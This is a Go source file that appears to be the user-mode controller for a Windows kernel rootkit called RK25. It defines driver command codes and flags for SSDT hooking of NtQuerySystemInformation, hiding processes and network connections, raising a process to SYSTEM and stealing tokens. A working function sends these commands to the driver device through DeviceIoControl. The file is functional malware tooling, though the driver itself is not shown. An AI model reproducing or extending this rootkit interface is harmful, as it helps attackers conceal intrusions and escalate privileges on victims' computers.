package ioctl

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	FILE_DEVICE_UNKNOWN      = 0x00000022
	FILE_READ_ACCESS         = 0x0001
	FILE_WRITE_ACCESS        = 0x0002
	METHOD_BUFFERED          = 0
	FUNCTION_RK25_IOCTL_TEST = 0x001
)

type RK25IoctlCode uint32

const (
	IOCTL_RK25_TEST_BUFFERED   RK25IoctlCode = 0x001
	IOCTL_RK25_HOOK_SSDT_QUERY RK25IoctlCode = 0x991
	IOCTL_RK25_HOOK_NET        RK25IoctlCode = 0x993
	IOCTL_RK25_PROC_HIDE       RK25IoctlCode = 0x101
	IOCTL_RK25_PROC_PRIV       RK25IoctlCode = 0x102
	IOCTL_RK25_NET_HIDE        RK25IoctlCode = 0x201
)

type RK25Action uint32

const (
	// Actions
	RK25_ACTION_ENABLE  RK25Action = 0x10000000
	RK25_ACTION_DISABLE RK25Action = 0x20000000

	// Hooks
	RK25_HOOK_SSDT_NTQSI_REPLACE  RK25Action = 0x01000000
	RK25_HOOK_SSDT_NTQSI_SPLICING RK25Action = 0x02000000
	RK25_HOOK_SSDT_NTTP_REPLACE   RK25Action = 0x04000000
	RK25_HOOK_NET_DISPATCHER      RK25Action = 0x08000000

	// Target attribute
	RK25_TARGET_DECIMAL RK25Action = 0x00000001
	RK25_TARGET_STRING  RK25Action = 0x00000002
	RK25_TARGET_POINTER RK25Action = 0x00000004

	// Process specific
	RK25_PROC_PID            RK25Action = 0x01
	RK25_PROC_NAME           RK25Action = 0x02
	RK25_PROCESS_AS_EPROCESS RK25Action = 0x00001000
	RK25_PROCESS_CALLBACK    RK25Action = 0x00002000
	RK25_PROCESS_MODIFY      RK25Action = 0x00004000
	RK25_PROCESS_TO_SYSTEM   RK25Action = 0x00008000
	RK25_PROCESS_STEALING    RK25Action = 0x00010000

	// Net specific
	RK25_NET_TCP    RK25Action = 0x00000040
	RK25_NET_UDP    RK25Action = 0x00000080
	RK25_NET_LOCAL  RK25Action = 0x00000100
	RK25_NET_REMOTE RK25Action = 0x00000200
)

var IOCTL_RK25_TEST_BUFFERED_ = uint32(
	(FILE_DEVICE_UNKNOWN << 16) |
		((FILE_READ_ACCESS | FILE_WRITE_ACCESS) << 14) |
		(FUNCTION_RK25_IOCTL_TEST << 2) |
		METHOD_BUFFERED,
)

type RK25IoctlBuffer struct {
	Attr   uint32
	Buffer uintptr
}

func GetIoctlMethodBuffered(code RK25IoctlCode) uint32 {
	return uint32(
		(FILE_DEVICE_UNKNOWN << 16) |
			((FILE_READ_ACCESS | FILE_WRITE_ACCESS) << 14) |
			(uint32(code) << 2) |
			METHOD_BUFFERED,
	)
}

func InvokeIoctl(device string, code RK25IoctlCode, data []byte, action RK25Action) error {
	handle, err := windows.CreateFile(
		windows.StringToUTF16Ptr(device),
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		nil, windows.OPEN_EXISTING, 0, 0,
	)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(handle)

	buffer := make([]byte, len(data))
	copy(buffer, data)
	bufferPtr := uintptr(unsafe.Pointer(&buffer[0]))
	ioctlData := RK25IoctlBuffer{
		Attr:   uint32(action),
		Buffer: bufferPtr,
	}

	event, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(event)

	overlapped := windows.Overlapped{
		HEvent: event,
	}

	var bytesReturned uint32
	if err = windows.DeviceIoControl(
		handle,
		GetIoctlMethodBuffered(code),
		(*byte)(unsafe.Pointer(&ioctlData)),
		uint32(unsafe.Sizeof(ioctlData)),
		nil, 0, &bytesReturned, &overlapped,
	); err != nil {
		if windows.GetLastError() == windows.ERROR_IO_PENDING {
			if _, err := windows.WaitForSingleObject(overlapped.HEvent, windows.INFINITE); err != nil {
				return err
			}
		}

		if err = windows.GetLastError(); err != nil {
			return err
		}
	}

	return nil
}
